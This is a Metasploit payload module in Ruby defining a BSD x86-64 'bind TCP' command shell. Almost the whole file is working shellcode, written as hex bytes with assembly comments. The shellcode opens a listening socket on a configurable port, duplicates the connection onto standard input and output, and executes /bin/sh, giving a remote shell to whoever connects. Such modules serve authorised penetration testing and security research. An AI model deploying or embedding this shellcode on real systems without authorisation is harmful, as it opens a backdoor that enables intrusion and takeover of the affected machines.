##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/handler/bind_tcp'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module MetasploitModule

  CachedSize = 88

  include Msf::Payload::Single
  include Msf::Payload::Bsd
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'BSD x64 Command Shell, Bind TCP Inline',
      'Description'   => 'Listen for a connection and spawn a command shell',
      'Author'        => 'Balazs Bucsay @xoreipeip <balazs.bucsay[-at-]rycon[-dot-]hu>',
      'References'    => ['URL', 'https://github.com/earthquake/shellcodes/blob/master/x86_64_bsd_bind_tcp.asm.c'],
      'License'       => MSF_LICENSE,
      'Platform'      => 'bsd',
      'Arch'          => ARCH_X64,
      'Handler'       => Msf::Handler::BindTcp,
      'Session'       => Msf::Sessions::CommandShellUnix,
      'Payload'       =>
        {
          'Offsets' =>
            {
              'LPORT'    => [ 18, 'n' ],
            },
          'Payload' =>
            "\x6a\x61"             + #	pushq  $0x61                       #
            "\x58"                 + #	pop    %rax                        #
            "\x99"                 + #	cltd                               #
            "\x6a\x02"             + #	pushq  $0x2                        #
            "\x5f"                 + #	pop    %rdi                        #
            "\x6a\x01"             + #	pushq  $0x1                        #
            "\x5e"                 + #	pop    %rsi                        #
            "\x0f\x05"             + #	syscall                            #
            "\x48\x97"             + #	xchg   %rax,%rdi                   #
            "\x52"                 + #	push   %rdx                        #
            "\xba\x00\x02\x11\x5C" + #	mov edx,0x5c110200                 #
            "\x52"                 + #	push   %rdx                        #
            "\x48\x89\xe6"         + #	mov    %rsp,%rsi                   #
            "\x6a\x10"             + #	pushq  $0x10                       #
            "\x5a"                 + #	pop    %rdx                        #
            "\x04\x66"             + #	add    $0x66,%al                   #
            "\x0f\x05"             + #	syscall                            #
            "\x48\x31\xf6"         + #	xor    %rsi,%rsi                   #
            "\x6a\x6a"             + #	pushq  $0x6a                       #
            "\x58"                 + #	pop    %rax                        #
            "\x0f\x05"             + #	syscall                            #
            "\x99"                 + #	cltd                               #
            "\x04\x1e"             + #	add    $0x1e,%al                   #
            "\x0f\x05"             + #	syscall                            #
            "\x48\x89\xc7"         + #	mov    %rax,%rdi                   #
            "\x6a\x5a"             + #	pushq  $0x5a                       #
            "\x58"                 + #	pop    %rax                        #
            "\x0f\x05"             + #	syscall                            #
            "\xff\xc6"             + #	inc    %esi                        #
            "\x04\x5a"             + #	add    $0x5a,%al                   #
            "\x0f\x05"             + #	syscall                            #
            "\xff\xc6"             + #	inc    %esi                        #
            "\x04\x59"             + #	add    $0x59,%al                   #
            "\x0f\x05"             + #	syscall                            #
            "\x52"                 + #   push   %rdx                        #
            "\x48\xbf\x2f\x2f"     + #   mov "//"                           #
            "\x62\x69\x6e\x2f"     + #   "bin/sh"                           #
            "\x73\x68"             + #   mov    $0x68732f6e69622f2f,%rdi    #
            "\x57"                 + #	push   %rdi                        #
            "\x48\x89\xe7"         + #	mov    %rsp,%rdi                   #
            "\x52"                 + #	push   %rdx                        #
            "\x57"                 + #	push   %rdi                        #
            "\x48\x89\xe6"         + #	mov    %rsp,%rsi                   #
            "\x04\x39"             + #	add    $0x39,%al                   #
            "\x0f\x05"              #   syscall                            #
        }
      ))
  end
end
